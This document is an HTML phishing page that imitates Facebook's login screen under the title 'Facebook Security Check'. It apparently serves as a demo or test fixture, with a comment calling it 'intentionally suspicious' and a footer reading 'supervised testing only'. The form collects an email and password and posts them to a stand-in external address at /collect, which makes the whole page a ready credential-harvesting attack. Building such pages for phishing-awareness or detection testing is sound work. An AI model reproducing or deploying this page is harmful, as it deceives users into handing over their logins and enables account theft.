<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebook Security Check</title>
  <style>
    body { font-family: Arial, sans-serif; background:#f0f2f5; margin:0; }
    .wrap { max-width:420px; margin:60px auto; background:#fff; padding:28px; border-radius:12px; box-shadow:0 8px 30px rgba(0,0,0,.12); }
    h1 { color:#1877f2; margin:0 0 10px; font-size:32px; }
    p { color:#555; margin-bottom:20px; }
    input { width:100%; padding:12px; margin:8px 0; border:1px solid #ccc; border-radius:8px; font-size:15px; }
    button { width:100%; padding:12px; background:#1877f2; color:#fff; border:none; border-radius:8px; font-size:16px; font-weight:bold; cursor:pointer; }
    .note { margin-top:14px; font-size:12px; color:#b00020; }
  </style>
</head>
<body>
  <div class="wrap">
    <h1>facebook</h1>
    <p>Please re-enter your password to secure your account.</p>

    <!-- Intentionally suspicious for demo: page is served from 127.0.0.1, but form posts elsewhere -->
    <form action="http://198.51.100.99/collect" method="post">
      <input type="text" name="email" placeholder="Email or phone number" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>

    <div class="note">Demo page for supervised testing only.</div>
  </div>
</body>
</html>
